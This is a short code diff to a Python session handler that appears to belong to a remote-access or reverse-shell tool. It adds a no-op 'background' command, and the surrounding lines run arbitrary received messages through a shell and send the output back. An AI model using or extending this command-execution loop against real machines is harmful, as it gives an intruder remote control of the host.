@@ -27,6 +27,8 @@ def session_handler():
                 print(os.getcwd())
                 res = os.getcwd()
                 conn_out(res)
+            elif msg == "background":
+                pass
             else:
                 com = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 res = com.stdout.read() + com.stderr.read()
